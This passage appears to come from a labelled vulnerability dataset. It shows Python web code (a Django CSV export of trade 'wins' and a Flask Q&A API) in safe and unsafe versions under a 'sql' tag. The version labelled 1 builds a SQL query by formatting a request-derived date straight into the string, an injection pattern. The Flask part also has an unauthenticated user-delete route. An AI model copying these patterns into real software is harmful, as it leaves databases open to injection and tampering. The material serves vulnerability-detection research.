        """""" Get field specified in Win model """"""
        return self._get_model_field(Win, name)

    def _val_to_str(self, val):
        if val is True:
            return 'Yes'
        elif val is False:
            return 'No'
        elif val is None:
            return ''
        else:
            return str(val)

    @functools.lru_cache(None)
    def _choices_dict(self, choices):
        return dict(choices)

    def _get_win_data(self, win):
        """""" Take Win dict, return ordered dict of {name -> value} """"""

        # want consistent ordering so CSVs are always same format
        win_data = collections.OrderedDict()

        # local fields
        for field_name in self.win_fields:
            if field_name in self.IGNORE_FIELDS:
                continue

            model_field = self._get_win_field(field_name)
            if field_name == 'user':
                value = str(self.users_map[win['user_id']])
            elif field_name == 'created':
                value = win[field_name].date()  # don't care about time
            elif field_name == 'cdms_reference':
                # numeric cdms reference numbers should be prefixed with
                # an apostrophe to make excel interpret them as text
                value = win[field_name]
                try:
                    int(value)
                except ValueError:
                    pass
                else:
                    if value.startswith('0'):
                        value = ""'"" + value
            else:
                value = win[field_name]
            # if it is a choicefield, do optimized lookup of the display value
            if model_field.choices and value:
                try:
                    value = self._choices_dict(model_field.choices)[value]
                except KeyError as e:
                    if model_field.attname == 'hvc':
                        value = value
                    else:
                        raise e
            else:
                comma_fields = [
                    'total_expected_export_value',
                    'total_expected_non_export_value',
                    'total_expected_odi_value',
                ]
                if field_name in comma_fields:
                    value = ""£{:,}"".format(value)

            model_field_name = model_field.verbose_name or model_field.name
            win_data[model_field_name] = self._val_to_str(value)

        # remote fields
        win_data['contributing advisors/team'] = (
            ', '.join(map(str, self.table_maps['advisors'][win['id']]))
        )

        # get customer email sent & date
        notifications = self.table_maps['notifications'][win['id']]
        # old Wins do not have notifications
        email_sent = bool(notifications or win['complete'])
        win_data['customer email sent'] = self._val_to_str(email_sent)
        if notifications:
            win_data['customer email date'] = str(
                notifications[0].created.date())
        elif win['complete']:
            win_data['customer email date'] = '[manual]'
        else:
            win_data['customer email date'] = ''

        win_data.update(self._extract_breakdowns(win))
        win_data.update(self._confirmation(win))

        return win_data

    def _make_flat_wins_csv(self, deleted=False):
        """""" Make CSV of all Wins, with non-local data flattened """"""

        if deleted:
            wins = Win.objects.inactive()
        else:
            wins = Win.objects.all()

        if deleted:
            # ignore users should show up in normal CSV
            wins = wins.exclude(
                user__email__in=settings.IGNORE_USERS
            )

        wins = wins.values()

        win_datas = [self._get_win_data(win) for win in wins]
        stringio = io.StringIO()
        stringio.write(u'\ufeff')
        if win_datas:
            csv_writer = csv.DictWriter(stringio, win_datas[0].keys())
            csv_writer.writeheader()
            for win_data in win_datas:
                csv_writer.writerow(win_data)
        return stringio.getvalue()

    def _make_user_csv(self):
        users = User.objects.all()
        user_dicts = [
            {'name': u.name, 'email': u.email, 'joined': u.date_joined}
            for u in users
        ]
        stringio = io.StringIO()
        csv_writer = csv.DictWriter(stringio, user_dicts[0].keys())
        csv_writer.writeheader()
        for user_dict in user_dicts:
            csv_writer.writerow(user_dict)
        return stringio.getvalue()

    def _make_plain_csv(self, table):
        """""" Get CSV of table """"""

        stringio = io.StringIO()
        cursor = connection.cursor()
        cursor.execute(""select * from wins_{};"".format(table))
        csv_writer = csv.writer(stringio)
        header = [i[0] for i in cursor.description]
        csv_writer.writerow(header)
        csv_writer.writerows(cursor)
        return stringio.getvalue()

    def get(self, request, format=None):
        bytesio = io.BytesIO()
        zf = zipfile.ZipFile(bytesio, 'w')
        for table in ['customerresponse', 'notification', 'advisor']:
            csv_str = self._make_plain_csv(table)
            zf.writestr(table + 's.csv', csv_str)
        full_csv_str = self._make_flat_wins_csv()
        zf.writestr('wins_complete.csv', full_csv_str)
        full_csv_del_str = self._make_flat_wins_csv(deleted=True)
        zf.writestr('wins_deleted_complete.csv', full_csv_del_str)
        user_csv_str = self._make_user_csv()
        zf.writestr('users.csv', user_csv_str)
        zf.close()
        return HttpResponse(bytesio.getvalue(), content_type=mimetypes.types_map['.csv'])


class Echo(object):
    """"""An object that implements just the write method of the file-like
    interface.
    """"""

    def write(self, value):
        """"""Write the value by returning it, instead of storing in a buffer.""""""
        return value


@method_decorator(gzip_page, name='dispatch')
class CompleteWinsCSVView(CSVView):

    permission_classes = (IsDataTeamServer,)

    def _make_flat_wins_csv(self, deleted=False):
        """""" Make CSV of all Wins, with non-local data flattened """"""

        if deleted:
            wins = Win.objects.inactive()
        else:
            wins = Win.objects.all()

        if deleted:
            # ignore users should show up in normal CSV
            wins = wins.exclude(
                user__email__in=settings.IGNORE_USERS
            )

        wins = wins.values()

        for win in wins:
            yield self._get_win_data(win)

    def _make_flat_wins_csv_stream(self, win_data_generator):
        stringio = Echo()
        yield stringio.write(u'\ufeff')
        first = next(win_data_generator)
        csv_writer = csv.DictWriter(stringio, first.keys())
        header = dict(zip(first.keys(), first.keys()))
        yield csv_writer.writerow(header)
        yield csv_writer.writerow(first)

        for win_data in win_data_generator:
            yield csv_writer.writerow(win_data)

    def streaming_response(self, filename):
        resp = StreamingHttpResponse(
            self._make_flat_wins_csv_stream(self._make_flat_wins_csv()),
            content_type=mimetypes.types_map['.csv'],
        )
        resp['Content-Disposition'] = f'attachent; filename={filename}'
        return resp

    def get(self, request, format=None):
        return self.streaming_response(f'wins_complete_{now().isoformat()}.csv')


@method_decorator(gzip_page, name='dispatch')
class CurrentFinancialYearWins(CompleteWinsCSVView):

    # permission_classes = (permissions.IsAdminUser,)
    end_date = None

    def _make_flat_wins_csv(self, **kwargs):
        """"""
        Make CSV of all completed Wins till now for this financial year, with non-local data flattened
        remove all rows where:
        1. total expected export value = 0 and total non export value = 0 and total odi value = 0
        2. date created = today (not necessary if this task runs before end of the day for next day download)
        3. customer email sent is False / No
        4. Customer response received is not from this financial year
        Note that this view removes win, notification and customer response entries
        that might have been made inactive in duecourse
        """"""
        with connection.cursor() as cursor:
            if self.end_date:
                cursor.execute(""SELECT id FROM wins_completed_wins_fy where created <= %s"", (self.end_date,))
            else:
                cursor.execute(""SELECT id FROM wins_completed_wins_fy"")
            ids = cursor.fetchall()

        wins = Win.objects.filter(id__in=[id[0] for id in ids]).values()

        for win in wins:
            yield self._get_win_data(win)

    def get(self, request, format=None):
        end_str = request.GET.get(""end"", None)
        if end_str:
            try:
                self.end_date = models.DateField().to_python(end_str)
            except ValidationError:
                self.end_date = None

        return self.streaming_response(f'wins_current_fy_{now().isoformat()}.csv')
/n/n/n",0,sql
3,49,307587cc00d2290a433bf74bd305aecffcbb05a2,"/wins/views/flat_csv.py/n/nimport collections
import csv
import functools
import io
import zipfile
from operator import attrgetter
import mimetypes

from django.conf import settings
from django.core.exceptions import ValidationError
from django.db import connection, models
from django.http import HttpResponse, StreamingHttpResponse
from django.utils.decorators import method_decorator
from django.utils.timezone import now
from django.views.decorators.gzip import gzip_page

from rest_framework import permissions
from rest_framework.views import APIView

from alice.authenticators import IsDataTeamServer
from ..constants import BREAKDOWN_TYPES
from ..models import Advisor, Breakdown, CustomerResponse, Notification, Win
from ..serializers import CustomerResponseSerializer, WinSerializer
from users .models import User


class CSVView(APIView):
    """""" Endpoint returning CSV of all Win data, with foreign keys flattened """"""

    permission_classes = (permissions.IsAdminUser,)
    # cache for speed
    win_fields = WinSerializer().fields
    customerresponse_fields = CustomerResponseSerializer().fields
    IGNORE_FIELDS = ['responded', 'sent', 'country_name', 'updated',
                     'complete', 'type', 'type_display',
                     'export_experience_display', 'location']

    def __init__(self, **kwargs):
        # cache some stuff to make flat CSV. like prefetch but works easily
        # with .values()
        self.users_map = {u.id: u for u in User.objects.all()}
        prefetch_tables = [
            ('advisors', Advisor),
            ('breakdowns', Breakdown),
            ('confirmations', CustomerResponse),
            ('notifications', Notification),
        ]
        self.table_maps = {}
        for table, model in prefetch_tables:
            prefetch_map = collections.defaultdict(list)
            instances = model.objects.all()
            if table == 'notifications':
                instances = instances.filter(type='c').order_by('created')
            for instance in instances:
                prefetch_map[instance.win_id].append(instance)
            self.table_maps[table] = prefetch_map
        super().__init__(**kwargs)

    def _extract_breakdowns(self, win):
        """""" Return list of 10 tuples, 5 for export, 5 for non-export """"""

        breakdowns = self.table_maps['breakdowns'][win['id']]
        retval = []
        for db_val, name in BREAKDOWN_TYPES:

            # get breakdowns of given type sorted by year
            type_breakdowns = [b for b in breakdowns if b.type == db_val]
            type_breakdowns = sorted(type_breakdowns, key=attrgetter('year'))

            # we currently solicit 5 years worth of breakdowns, but historic
            # data may have no input for some years
            for index in range(5):
                try:
                    breakdown = ""{0}: £{1:,}"".format(
                        type_breakdowns[index].year,
                        type_breakdowns[index].value,
                    )
                except IndexError:
                    breakdown = None

                retval.append((
                    ""{0} breakdown {1}"".format(name, index + 1),
                    breakdown,
                ))

        return retval

    def _confirmation(self, win):
        """""" Add fields for confirmation """"""

        if win['id'] in self.table_maps['confirmations']:
            confirmation = self.table_maps['confirmations'][win['id']][0]
        else:
            confirmation = None

        values = [
            ('customer response recieved',
             self._val_to_str(bool(confirmation)))
        ]
        for field_name in self.customerresponse_fields:
            if field_name in ['win']:
                continue

            model_field = self._get_customerresponse_field(field_name)
            if confirmation:
                if model_field.choices:
                    display_fn = getattr(
                        confirmation, ""get_{0}_display"".format(field_name)
                    )
                    value = display_fn()
                else:
                    value = getattr(confirmation, field_name)
            else:
                value = ''

            model_field_name = model_field.verbose_name or model_field.name
            if model_field_name == 'created':
                csv_field_name = 'date response received'
                if value:
                    value = value.date()  # just want date
            else:
                csv_field_name = model_field_name

            values.append((csv_field_name, self._val_to_str(value)))
        return values

    def _get_model_field(self, model, name):
        return next(
            filter(lambda field: field.name == name, model._meta.fields)
        )

    @functools.lru_cache(None)
    def _get_customerresponse_field(self, name):
        """""" Get field specified in CustomerResponse model """"""
        return self._get_model_field(CustomerResponse, name)

    @functools.lru_cache(None)
    def _get_win_field(self, name):
        """""" Get field specified in Win model """"""
        return self._get_model_field(Win, name)

    def _val_to_str(self, val):
        if val is True:
            return 'Yes'
        elif val is False:
            return 'No'
        elif val is None:
            return ''
        else:
            return str(val)

    @functools.lru_cache(None)
    def _choices_dict(self, choices):
        return dict(choices)

    def _get_win_data(self, win):
        """""" Take Win dict, return ordered dict of {name -> value} """"""

        # want consistent ordering so CSVs are always same format
        win_data = collections.OrderedDict()

        # local fields
        for field_name in self.win_fields:
            if field_name in self.IGNORE_FIELDS:
                continue

            model_field = self._get_win_field(field_name)
            if field_name == 'user':
                value = str(self.users_map[win['user_id']])
            elif field_name == 'created':
                value = win[field_name].date()  # don't care about time
            elif field_name == 'cdms_reference':
                # numeric cdms reference numbers should be prefixed with
                # an apostrophe to make excel interpret them as text
                value = win[field_name]
                try:
                    int(value)
                except ValueError:
                    pass
                else:
                    if value.startswith('0'):
                        value = ""'"" + value
            else:
                value = win[field_name]
            # if it is a choicefield, do optimized lookup of the display value
            if model_field.choices and value:
                try:
                    value = self._choices_dict(model_field.choices)[value]
                except KeyError as e:
                    if model_field.attname == 'hvc':
                        value = value
                    else:
                        raise e
            else:
                comma_fields = [
                    'total_expected_export_value',
                    'total_expected_non_export_value',
                    'total_expected_odi_value',
                ]
                if field_name in comma_fields:
                    value = ""£{:,}"".format(value)

            model_field_name = model_field.verbose_name or model_field.name
            win_data[model_field_name] = self._val_to_str(value)

        # remote fields
        win_data['contributing advisors/team'] = (
            ', '.join(map(str, self.table_maps['advisors'][win['id']]))
        )

        # get customer email sent & date
        notifications = self.table_maps['notifications'][win['id']]
        # old Wins do not have notifications
        email_sent = bool(notifications or win['complete'])
        win_data['customer email sent'] = self._val_to_str(email_sent)
        if notifications:
            win_data['customer email date'] = str(
                notifications[0].created.date())
        elif win['complete']:
            win_data['customer email date'] = '[manual]'
        else:
            win_data['customer email date'] = ''

        win_data.update(self._extract_breakdowns(win))
        win_data.update(self._confirmation(win))

        return win_data

    def _make_flat_wins_csv(self, deleted=False):
        """""" Make CSV of all Wins, with non-local data flattened """"""

        if deleted:
            wins = Win.objects.inactive()
        else:
            wins = Win.objects.all()

        if deleted:
            # ignore users should show up in normal CSV
            wins = wins.exclude(
                user__email__in=settings.IGNORE_USERS
            )

        wins = wins.values()

        win_datas = [self._get_win_data(win) for win in wins]
        stringio = io.StringIO()
        stringio.write(u'\ufeff')
        if win_datas:
            csv_writer = csv.DictWriter(stringio, win_datas[0].keys())
            csv_writer.writeheader()
            for win_data in win_datas:
                csv_writer.writerow(win_data)
        return stringio.getvalue()

    def _make_user_csv(self):
        users = User.objects.all()
        user_dicts = [
            {'name': u.name, 'email': u.email, 'joined': u.date_joined}
            for u in users
        ]
        stringio = io.StringIO()
        csv_writer = csv.DictWriter(stringio, user_dicts[0].keys())
        csv_writer.writeheader()
        for user_dict in user_dicts:
            csv_writer.writerow(user_dict)
        return stringio.getvalue()

    def _make_plain_csv(self, table):
        """""" Get CSV of table """"""

        stringio = io.StringIO()
        cursor = connection.cursor()
        cursor.execute(""select * from wins_{};"".format(table))
        csv_writer = csv.writer(stringio)
        header = [i[0] for i in cursor.description]
        csv_writer.writerow(header)
        csv_writer.writerows(cursor)
        return stringio.getvalue()

    def get(self, request, format=None):
        bytesio = io.BytesIO()
        zf = zipfile.ZipFile(bytesio, 'w')
        for table in ['customerresponse', 'notification', 'advisor']:
            csv_str = self._make_plain_csv(table)
            zf.writestr(table + 's.csv', csv_str)
        full_csv_str = self._make_flat_wins_csv()
        zf.writestr('wins_complete.csv', full_csv_str)
        full_csv_del_str = self._make_flat_wins_csv(deleted=True)
        zf.writestr('wins_deleted_complete.csv', full_csv_del_str)
        user_csv_str = self._make_user_csv()
        zf.writestr('users.csv', user_csv_str)
        zf.close()
        return HttpResponse(bytesio.getvalue(), content_type=mimetypes.types_map['.csv'])


class Echo(object):
    """"""An object that implements just the write method of the file-like
    interface.
    """"""

    def write(self, value):
        """"""Write the value by returning it, instead of storing in a buffer.""""""
        return value


@method_decorator(gzip_page, name='dispatch')
class CompleteWinsCSVView(CSVView):

    permission_classes = (IsDataTeamServer,)

    def _make_flat_wins_csv(self, deleted=False):
        """""" Make CSV of all Wins, with non-local data flattened """"""

        if deleted:
            wins = Win.objects.inactive()
        else:
            wins = Win.objects.all()

        if deleted:
            # ignore users should show up in normal CSV
            wins = wins.exclude(
                user__email__in=settings.IGNORE_USERS
            )

        wins = wins.values()

        for win in wins:
            yield self._get_win_data(win)

    def _make_flat_wins_csv_stream(self, win_data_generator):
        stringio = Echo()
        yield stringio.write(u'\ufeff')
        first = next(win_data_generator)
        csv_writer = csv.DictWriter(stringio, first.keys())
        header = dict(zip(first.keys(), first.keys()))
        yield csv_writer.writerow(header)
        yield csv_writer.writerow(first)

        for win_data in win_data_generator:
            yield csv_writer.writerow(win_data)

    def streaming_response(self, filename):
        resp = StreamingHttpResponse(
            self._make_flat_wins_csv_stream(self._make_flat_wins_csv()),
            content_type=mimetypes.types_map['.csv'],
        )
        resp['Content-Disposition'] = f'attachent; filename={filename}'
        return resp

    def get(self, request, format=None):
        return self.streaming_response(f'wins_complete_{now().isoformat()}.csv')


@method_decorator(gzip_page, name='dispatch')
class CurrentFinancialYearWins(CompleteWinsCSVView):

    # permission_classes = (permissions.IsAdminUser,)
    end_date = None

    def _make_flat_wins_csv(self, **kwargs):
        """"""
        Make CSV of all completed Wins till now for this financial year, with non-local data flattened
        remove all rows where:
        1. total expected export value = 0 and total non export value = 0 and total odi value = 0
        2. date created = today (not necessary if this task runs before end of the day for next day download)
        3. customer email sent is False / No
        4. Customer response received is not from this financial year
        Note that this view removes win, notification and customer response entries
        that might have been made inactive in duecourse
        """"""
        sql_str = ""SELECT id FROM wins_completed_wins_fy""
        if self.end_date:
            sql_str = f""{sql_str} where created <= '{self.end_date.strftime('%m-%d-%Y')}'""

        with connection.cursor() as cursor:
            cursor.execute(sql_str)
            ids = cursor.fetchall()

        wins = Win.objects.filter(id__in=[id[0] for id in ids]).values()

        for win in wins:
            yield self._get_win_data(win)

    def get(self, request, format=None):
        end_str = request.GET.get(""end"", None)
        if end_str:
            try:
                self.end_date = models.DateField().to_python(end_str)
            except ValidationError:
                self.end_date = None

        return self.streaming_response(f'wins_current_fy_{now().isoformat()}.csv')
/n/n/n",1,sql
4,184,ad02c932f85c0f4ed6c1e561efc5edc163347806,"app/__init__.py/n/n# Flask create app

# Author: P8ul
# https://github.com/p8ul

from flask import Flask
from .migrations.db import db


def create_app(config_filename):
    app = Flask(__name__)
    app.config.from_object(config_filename)

    with app.app_context():
        pass

    """""" Basic Routes """"""

    # register our blueprints
    configure_blueprints(app)

    # register extensions
    configure_extensions()

    return app


def configure_blueprints(app):
    """"""Configure blueprints .""""""
    from .questions.api.v1.view import question_blueprint
    from .home.views import home_blueprint
    from .auth.api.v1.view import auth_blueprint
    from .answers.api.v1.view import answers_blueprint
    from .votes.api.v1.view import votes_blueprint
    from .comments.api.v1.view import comments_blueprint

    app_blueprints = [
        answers_blueprint,
        question_blueprint,
        auth_blueprint,
        votes_blueprint,
        comments_blueprint,
        home_blueprint
    ]

    for bp in app_blueprints:
        app.register_blueprint(bp)


def configure_extensions():
    db.test()


if __name__ == ""__main__"":
    app = create_app(""config"")
    app.run(debug=True)
/n/n/napp/answers/api/v1/view.py/n/n# APIs Resources

# Author: P8ul
# https://github.com/p8ul

from flask import Blueprint, request, make_response, jsonify, session
from flask.views import MethodView
from ...models import Table
from ....utils import jwt_required

answers_blueprint = Blueprint('answers', __name__)


class CreateAPIView(MethodView):
    """""" Update Instance api resource """"""

    @jwt_required
    def put(self, question_id=None, answer_id=None):
        data = request.get_json(force=True)
        data['question_id'] = question_id
        data['answer_id'] = answer_id
        data['user_id'] = session.get('user_id')

        response = Table(data).update()
        if response == 200:
            response_object = {
                'status': 'success',
                'message': 'Update successful'
            }
            return make_response(jsonify(response_object)), 200
        if response == 302:
            response_object = {
                'status': 'fail',
                'message': 'Please provide correct answer and question id'
            }
            return make_response(jsonify(response_object)), 400
        if response == 203:
            response_object = {
                'status': 'fail',
                'message': 'Unauthorized request.'
            }
            return make_response(jsonify(response_object)), 401

        else:
            response_object = {
                'status': 'fail',
                'message': 'Please provide correct answer and question id'
            }
            return make_response(jsonify(response_object)), 400

    @jwt_required
    def post(self, question_id=None):
        # get the post data
        data = request.get_json(force=True)
        data['question_id'] = question_id
        data['user_id'] = session.get('user_id')
        answer = Table(data)
        response = answer.save()
        if response:
            response_object = {
                'status': 'success',
                'message': response
            }
            return make_response(jsonify(response_object)), 201

        response_object = {
            'status': 'fail',
            'message': 'Unknown question id. Try a different id.'
        }
        return make_response(jsonify(response_object)), 400


class ListAPIView(MethodView):
    """"""
    List API Resource
    """"""
    @jwt_required
    def get(self, answer_id=None):
        data = dict()
        data['answer_id'] = answer_id
        data['user_id'] = session.get('user_id')
        if answer_id:
            results = Table(data).filter_by()
            if len(results) < 1:
                response_object = {
                    'results': 'Answer not found', 'status': 'fail'
                }
                return make_response(jsonify(response_object)), 404
            response_object = {
                'results': results, 'status': 'success'
            }
            return (jsonify(response_object)), 200
        response_object = {'results': Table(data).query(), 'status': 'success'}
        return (jsonify(response_object)), 200


# Define the API resources
create_view = CreateAPIView.as_view('create_api')
list_view = ListAPIView.as_view('list_api')

# Add Rules for API Endpoints
answers_blueprint.add_url_rule(
    '/api/v1/questions/<string:question_id>/answers',
    view_func=create_view,
    methods=['POST']
)

answers_blueprint.add_url_rule(
    '/api/v1/questions/<string:question_id>/answers/<string:answer_id>',
    view_func=create_view,
    methods=['PUT']
)

answers_blueprint.add_url_rule(
    '/api/v1/questions/answers',
    view_func=list_view,
    methods=['GET']
)

answers_blueprint.add_url_rule(
    '/api/v1/questions/answers/<string:answer_id>',
    view_func=list_view,
    methods=['GET']
)
/n/n/napp/answers/models.py/n/n# Custom Model

# Author: P8ul
# https://github.com/p8ul

""""""
    This class will connect to a Database and perform crud actions
    Has relevant getters, setters & mutation methods
""""""

import psycopg2
import psycopg2.extensions
from psycopg2.extras import RealDictCursor
from config import BaseConfig
from ..utils import db_config


class Table:
    def __init__(self, data={}):
        self.config = db_config(BaseConfig.DATABASE_URI)
        self.table = 'answers'
        self.answer_body = data.get('answer_body')
        self.question_id = data.get('question_id')
        self.answer_id = data.get('answer_id')
        self.accepted = data.get('accepted')
        self.user_id = data.get('user_id')

    def save(self):
        """"""
        Creates an answer record in answers table
        :return: None of inserted record
        """"""
        con, response = psycopg2.connect(**self.config), None
        cur = con.cursor(cursor_factory=RealDictCursor)
        try:
            query = ""INSERT INTO answers (user_id, answer_body, question_id) VALUES (%s, %s, %s) RETURNING *; ""
            cur.execute(query, (self.user_id, self.answer_body, self.question_id))
            con.commit()
            response = cur.fetchone()
        except Exception as e:
            print(e)
        con.close()
        return response

    def query(self):
        """"""
        Fetch all records from a answers table
        :return: list: query set
        """"""
        con = psycopg2.connect(**self.config)
        cur = con.cursor(cursor_factory=RealDictCursor)
        cur.execute(
            """""" SELECT *, ( SELECT  count(*) from votes 
                WHERE votes.answer_id=answers.answer_id AND vote=true ) as upVotes,
                ( SELECT count(*) from votes WHERE votes.answer_id=answers.answer_id
                AND vote=false ) as downVotes FROM  answers
            """"""
        )
        queryset_list = cur.fetchall()
        con.close()
        return queryset_list

    def filter_by(self):
        """"""
        Select a column(s) from answer table
        :return: list: queryset list
        """"""
        try:
            con = psycopg2.connect(**self.config)
            cur = con.cursor(cursor_factory=RealDictCursor)
            query = ""SELECT * FROM answers WHERE answer_id=%s""
            cur.execute(query, self.answer_id)
            queryset_list = cur.fetchall()
            con.close()
            return queryset_list
        except:
            return []

    def question_author(self):
        con = psycopg2.connect(**self.config)
        try:
            cur = con.cursor(cursor_factory=RealDictCursor)
            query = ""SELECT user_id FROM questions WHERE question_id=%s""
            cur.execute(query, self.question_id)
            return cur.fetchall()

        except Exception as e:
            print(e)
        con.close()
        return False

    def answer_author(self):
        try:
            con = psycopg2.connect(**self.config)
            cur = con.cursor(cursor_factory=RealDictCursor)
            query = ""SELECT user_id FROM answers WHERE answer_id=%s""
            cur.execute(query, self.answer_id)
            queryset_list = cur.fetchall()
            con.close()
            return queryset_list
        except Exception as e:
            return False

    def update(self):
        try:
            answer_author = self.answer_author()[0].get('user_id')
            question_author = self.question_author()[0].get('user_id')
            # current user is the answer author
            if answer_author == self.user_id:
                # update answer
                response = 200 if self.update_answer() else 304
                return response

            # current user is question author
            elif question_author == self.user_id:
                # mark it as accepted
                response = self.update_accept_field()
                response = 200 if response else 304
                return response

            # other users
            else:
                return 203
        except:
            return 404

    def update_accept_field(self):
        """"""
        Update an answer column
        :return: bool:
        """"""
        con, result = psycopg2.connect(**self.config), True
        cur = con.cursor(cursor_factory=RealDictCursor)
        try:
            query = ""UPDATE answers SET accepted=%s WHERE answer_id=%s AND question_id=%s""
            cur.execute(query, (self.accepted, self.answer_id, self.question_id))
            con.commit()
        except Exception as e:
            print(e)
            result = False
        con.close()
        return result

    def update_answer(self):
        """"""
        Update an answer column
        :return: bool:
        """"""
        con = psycopg2.connect(**self.config)
        cur = con.cursor(cursor_factory=RealDictCursor)
        try:
            query = ""UPDATE answers SET answer_body=%s WHERE answer_id=%s""
            cur.execute(query, (self.answer_body, self.answer_id))
            con.commit()
        except Exception as e:
            print(e)
            con.close()
            return False
        con.close()
        return True

    def delete(self):
        pass



/n/n/napp/answers/test/base.py/n/nimport unittest

from ... import create_app
app = create_app(""config.TestConfig"")


class BaseTestCase(unittest.TestCase):
    """"""A base test case.""""""
    def create_app(self):
        app.config.from_object('config.TestConfig')
        return app

    def setUp(self):
        # method to invoke before each test.
        self.client = app.test_client()
        self.data = {
            'username': 'Paul',
            'email': 'pkinuthia10@gmail.com',
            'password': 'password'
        }
        """""" Login to get a JWT token """"""
        self.client.post('/api/v1/auth/signup', json=self.data)
        response = self.client.post('/api/v1/auth/login', json=self.data)
        self.token = response.get_json().get('auth_token')
        self.user_id = str(response.get_json()['id'])

    def tearDown(self):
        # method to invoke after each test.
        pass
/n/n/napp/answers/test/test_answer_model.py/n/n# APIs Testing

# Author: P8ul
# https://github.com/p8ul

import unittest
from ...test.base import BaseTestCase
from ..models import Table

table = Table()


class FlaskTestCase(BaseTestCase):

    """""" Test question model  """"""
    def test_question_model(self):
        query = table.query()
        self.assertIsInstance(query, type([]))

    def test_model_filter(self):
        query = table.filter_by()
        self.assertEqual(query, [])

    def test_model_save(self):
        query = table.save()
        self.assertEqual(query, None)

    def test_model_update(self):
        query = table.update()
        self.assertEqual(query, 404)

    def test_model_delete(self):
        query = table.delete()
        self.assertEqual(query, None)

    def test_model_question_author(self):
        query = table.question_author()
        self.assertEqual(query, False)

    def test_model_answer_author(self):
        query = table.answer_author()
        self.assertEqual(query, False)

    def test_model_accept(self):
        query = table.update_accept_field()
        self.assertEqual(query, True)

    def test_model_update_answer(self):
        query = table.update_answer()
        self.assertEqual(query, True)

    def test_model_init(self):
        keys = table.config.keys()
        self.assertIn(list(keys)[0], ['password', 'user', 'database', 'host'])
        self.assertEqual(len(list(keys)), 4)


if __name__ == '__main__':
    unittest.main()
/n/n/napp/answers/test/test_answers_apis.py/n/n# APIs Testing

# Author: P8ul
# https://github.com/p8ul

import unittest
from ...test.base import BaseTestCase


class FlaskTestCase(BaseTestCase):

    """""" Test List answers api """"""
    def test_list_answers(self):
        response = self.client.get(
            '/api/v1/questions/answers',
            headers={'Authorization': 'JWT ' + self.token}
        )
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response.get_json()['status'], 'success')

    """""" Test answers CRUD api """"""
    def test_post_update(self):
        """""" Initialize test data """"""
        data = {
            'title': 'Test title',
            'body': 'Test body',
            'answer_body': 'Test answer',
            'user': self.user_id
        }

        """""" Add test question""""""
        self.client.post(
            '/api/v1/questions/', json=data,
            headers={'Authorization': 'JWT ' + self.token}
        )

        response = self.client.get(
            '/api/v1/questions/',
            headers={'Authorization': 'JWT ' + self.token}
        )
        question_id = response.get_json().get('results')[0].get('question_id')

        """""" Test post answer """"""
        response = self.client.post(
            '/api/v1/questions/'+str(question_id)+'/answers', json=data,
            headers={'Authorization': 'JWT ' + self.token}
        )

        """""" Test status """"""
        self.assertEqual(response.status_code, 201)

        """""" Test if a question is created """"""
        self.assertEqual(response.get_json()['status'], 'success')


if __name__ == '__main__':
    unittest.main()
/n/n/napp/auth/api/v1/view.py/n/nfrom flask import Blueprint, request, make_response, jsonify, session
from flask.views import MethodView
from flask_bcrypt import Bcrypt
from ...models import Table
from ....utils import jwt_required, encode_auth_token
from ...validatons import validate_user_details

# globals b_crypt
b_crypt = Bcrypt()
auth_blueprint = Blueprint('auth', __name__)


class RegisterAPI(MethodView):
    """""" User Signup API Resource """"""
    def post(self):
        # get the post data
        data = request.get_json(force=True)
        data['user_id'] = session.get('user_id')
        # check if user already exists
        errors = validate_user_details(data)
        if len(errors) > 0:
            response_object = {
                'status': 'fail', 'errors': errors
            }
            return make_response(jsonify(response_object)), 401
        user = Table(data).filter_by_email()
        if not user:
            try:
                user = Table(data).save()
                auth_token = encode_auth_token(user.get('id')).decode()
                response_object = {
                    'status': 'success',
                    'message': 'Successfully registered.',
                    'id': user.get('id'), 'auth_token': auth_token
                }
                return make_response(jsonify(response_object)), 201
            except Exception as e:
                print(e)
                response_object = {
                    'status': 'fail', 'message': 'Some error occurred. Please try again.'
                }
                return make_response(jsonify(response_object)), 401
        else:
            response_object = {
                'status': 'fail', 'message': 'User already exists. Please Log in.',
            }
            return make_response(jsonify(response_object)), 202

    def delete(self, user_id=None):
        data = request.get_json(force=True)
        data['user_id'] = user_id
        Table(data).delete()
        response_object = {
            'status': 'success', 'message': 'User deleted successfully.',
        }
        return make_response(jsonify(response_object)), 200


class LoginAPI(MethodView):
    """""" User Login API Resource """"""
    def post(self):
        data = request.get_json(force=True)
        data['user_id'] = session.get('user_id')
        try:
            user = Table(data).filter_by_email()
            if len(user) >= 1 and data.get('password'):
                if b_crypt.check_password_hash(user[0].get('password'), data.get('password')):
                    auth_token = encode_auth_token(user[0].get('user_id'))
                else:
                    response_object = {'status': 'fail', 'message': 'Password or email do not match.'}
                    return make_response(jsonify(response_object)), 401
                try:
                    if auth_token:
                        response_object = {
                            'status': 'success', 'id': user[0].get('user_id'),
                            'message': 'Successfully logged in.',
                            'auth_token': auth_token.decode()
                        }
                        return make_response(jsonify(response_object)), 200
                except Exception as e:
                    return {""message"": 'Error decoding token'}, 401
            else:
                response_object = {'status': 'fail', 'message': 'User does not exist.'}
                return make_response(jsonify(response_object)), 404
        except Exception as e:
            print(e)
            response_object = {'status': 'fail', 'message': 'Try again'}
            return make_response(jsonify(response_object)), 500


class UserListAPI(MethodView):
    """""" User List Api Resource """"""
    @jwt_required
    def get(self, user_id=None):
        if user_id:
            user = Table({""user_id"": user_id}).filter_by()
            if len(user) < 1:
                response_object = {
                    'results': 'User not found',
                    'status': 'fail'
                }
                return make_response(jsonify(response_object)), 404
            response_object = {
                'results': user,
                'status': 'success'
            }
            return (jsonify(response_object)), 200

        response_object = {
            'results': Table().query(),
            'status': 'success'
        }
        return (jsonify(response_object)), 200


class LogoutAPI(MethodView):
    """""" Logout Resource """"""
    def post(self):
        # get auth token
        auth_header = request.headers.get('Authorization')
        return auth_header


# Define the API resources
registration_view = RegisterAPI.as_view('register_api')
login_view = LoginAPI.as_view('login_api')
user_view = UserListAPI.as_view('user_api')
logout_view = LogoutAPI.as_view('logout_api')

# Add Rules for API Endpoints
auth_blueprint.add_url_rule(
    '/api/v1/auth/signup',
    view_func=registration_view,
    methods=['POST']
)

# Add Rules for API Endpoints
auth_blueprint.add_url_rule(
    '/api/v1/auth/delete',
    view_func=registration_view,
    methods=['DELETE']
)
auth_blueprint.add_url_rule(
    '/api/v1/auth/login',
    view_func=login_view,
    methods=['POST']
)
auth_blueprint.add_url_rule(
    '/api/v1/auth/users',
    view_func=user_view,
    methods=['GET']
)
auth_blueprint.add_url_rule(
    '/api/v1/auth/users/<string:user_id>',
    view_func=user_view,
    methods=['GET']
)
